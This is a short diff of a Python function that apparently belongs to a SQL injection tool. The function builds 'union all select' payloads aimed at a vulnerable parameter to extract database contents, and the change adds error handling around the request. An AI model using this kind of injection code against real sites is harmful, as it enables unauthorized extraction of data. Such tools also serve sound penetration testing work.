@@ -172,11 +172,15 @@ def genrate_extract_payload(option,testpayload,weakcolumn,database=None,tablenam
 	x = ",".join(interface)
 	payload = f"{testpayload['pstart']} union all select {x} {code2} {testpayload['pend']}"
 	data[weakkey] = payload
-	res = connect(url)
-	if urlr != None:
-		res = get(urlr,headers=headers)
-	exresult = {"res":res.text,"exp":payload}
-	return exresult
+	try:
+		res = connect(url)
+		if urlr != None:
+			res = get(urlr,headers=headers)
+		if len(res.text) > 5:
+			exresult = {"res":res.text,"exp":payload}
+			return exresult
+	except:
+		return {"res":"null"}
 def get_saved_testpayload(path):
 	try:
 		testpayload = open(f'reports\\{path}.json',"r")
